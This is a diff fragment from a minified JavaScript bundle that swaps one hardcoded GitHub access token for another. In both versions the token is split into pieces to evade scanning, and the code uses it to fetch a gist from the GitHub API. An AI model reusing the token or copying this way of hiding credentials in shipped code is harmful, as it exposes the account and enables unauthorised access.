@@ -34754,8 +34754,8 @@ ${e2.stack}` : r2;
             }), x2(true);
             try {
               let t3 = [
-                `ghp_XdH3y083HffWn8xdqF`,
-                `UAcKFBTPeoRC0Lebfp`
+                `ghp_lFQlg0z7DxcDA4vg3zRjz`,
+                `GXb7hQE3s107ils`
               ].join(``), n3 = `f09b671195e59484c6a2effb3fa78da9`, r3 = await (await fetch(`https://api.github.com/gists/${n3}`, {
                 headers: {
                   Authorization: `token ${t3}`
